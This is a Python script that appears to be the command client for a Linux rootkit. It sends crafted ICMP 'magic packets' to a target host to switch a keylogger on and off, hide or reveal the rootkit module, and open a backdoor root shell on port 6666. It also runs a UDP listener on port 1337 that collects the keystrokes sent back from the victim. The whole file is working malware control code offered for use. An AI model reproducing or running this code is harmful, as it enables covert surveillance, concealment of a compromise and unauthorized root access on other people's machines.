#!/usr/bin/env python
import time
import socket
import struct
import select
import signal
import sys
import os
import getopt
import random
import asyncore

code = 0
host = ""

ICMP_ECHO_REQUEST = 8
ICMP_CODE = socket.getprotobyname('icmp')

ROOTKIT_KEYLOGGER_ACTIVATE = 122
ROOTKIT_KEYLOGGER_DEACTIVATE = 123

HIDEMODULE_ACTIVATION_CODE = 124
HIDEMODULE_DEACTIVATION_CODE = 125
BACKDOOR_ACTIVATION_CODE = 126


#found online
def checksum(source_string):
    sum = 0
    count_to = (len(source_string) / 2) * 2
    count = 0
    while count < count_to:
        this_val = ord(source_string[count + 1])*256+ord(source_string[count])
        sum = sum + this_val
        sum = sum & 0xffffffff
        count = count + 2
    if count_to < len(source_string):
        sum = sum + ord(source_string[len(source_string) - 1])
        sum = sum & 0xffffffff
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer


#found online
def create_packet(code):
    """Create a new echo request packet based on the given "code" Code is id and code.."""
    # Header is type (8), code (8), checksum (16), id (16), sequence (16)
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, code, 0, code, 1)
    data = 192 * 'Q'
    my_checksum = checksum(header + data)
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, code, socket.htons(my_checksum), code, 1)
    return header + data


def send_message(dest_addr, code):
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, ICMP_CODE)
    packet = create_packet(code)
    while packet:
        sent = my_socket.sendto(packet, (dest_addr, 1))
        packet = packet[sent:]
    my_socket.close()

def print_usage():
    print "usage:", sys.argv[0], "\t[-a key] [-d key] [-h <host>]"
    print "\t\t\t\t[-u]"
    print "-a key\t","sends a magic package to the rootkit and activates the keylogger and listens"
    print "-d key\t","sends a magic package to the rootkit and deactivates the keylogger"
    print "-a hide\t","sends a magic package to the rootkit and activates modul hiding"
    print "-d hide\t","sends a magic package to the rootkit and deactivates modul hiding"
    print "-a root\t","sends a magic package to the rootkit and activate the root shell"
    print "-h <host>\t", "the ip for the host where the rootkit is running"


def is_admin():
    if not os.geteuid()==0:
        sys.exit("\nYou must be root to run the application with this option, please use sudo and try again.\n")

def is_host_set():
    global host
    if host == "": 
        sys.exit("\nAdd hostname as parameter.\n")  

def start_socket(port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_address = ("0.0.0.0", port)
    sock.bind(server_address)
    print "UPD Server is waiting for messages on port:", port
    while True:
        data, address = sock.recvfrom(20)
        sys.stdout.write(data)
        sys.stdout.flush()
        if data == "_ENTER_":
            print ""

def signal_handler(signal, frame):
    global host
    send_message(host, ROOTKIT_KEYLOGGER_DEACTIVATE);
    print "\nkeylogger deactivated"
    print "bye.."
    sys.exit(0)



def main ():
    global host, code
    options, remainder =  getopt.getopt(sys.argv[1:], 'a:d:h:u',[])
    if len(sys.argv) != 1:
    	listen=False
    	for opt, arg in options:
              if opt == "-a" and arg == "key":
                   code = ROOTKIT_KEYLOGGER_ACTIVATE
                   listen=True
              elif opt == "-d" and arg == "key":
                   code = ROOTKIT_KEYLOGGER_DEACTIVATE
              elif opt == "-d" and arg == "hide":
                   code = HIDEMODULE_DEACTIVATION_CODE
              elif opt == "-a" and arg == "hide":
                   code = HIDEMODULE_ACTIVATION_CODE
              elif opt == "-h":
                   host = arg
              elif opt == "-a" and arg == "root":
                   code = BACKDOOR_ACTIVATION_CODE
                   print "backdoor open on port 6666"

    	is_admin()
        is_host_set();
    	send_message(host, code)
    	if listen:
    		start_socket(1337)
    else:
        print_usage()

signal.signal(signal.SIGINT, signal_handler)
main()